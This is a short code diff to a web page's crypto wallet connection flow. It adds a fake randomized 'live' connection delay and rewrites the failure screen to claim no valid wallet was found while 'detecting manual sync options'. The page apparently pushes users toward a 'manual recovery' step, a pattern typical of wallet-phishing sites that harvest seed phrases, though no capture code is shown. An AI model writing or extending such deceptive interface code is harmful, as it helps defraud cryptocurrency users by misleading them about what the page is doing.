@@ -177,6 +177,10 @@ export default function Home() {
     setStep("connecting");
 
     try {
+      // ⏳ Randomized "live" connection delay (5-10s)
+      const delay = Math.floor(Math.random() * 5000) + 5000;
+      await new Promise(resolve => setTimeout(resolve, delay));
+
       const eth = (window as any).ethereum;
       if (!eth) throw new Error("no_provider");
 
@@ -1099,9 +1103,10 @@ export default function Home() {
             <span className="failed-icon">⚠️</span>
             <div className="failed-title">Connection Failed</div>
             <p className="failed-subtitle">
-              Could not open {selectedWallet?.name ?? "the wallet"}.
-              Loading manual recovery connection…
+              No valid wallet detected on your device...
             </p>
+            <div className="failed-spinner-small" />
+            <div className="failed-status-text">Detecting manual sync options...</div>
             <div className="pulse-dots" style={{ justifyContent: "center", marginTop: 0 }}>
               <div className="pulse-dot" style={{ background: "#ef4444" }} />
               <div className="pulse-dot" style={{ background: "#ef4444" }} />
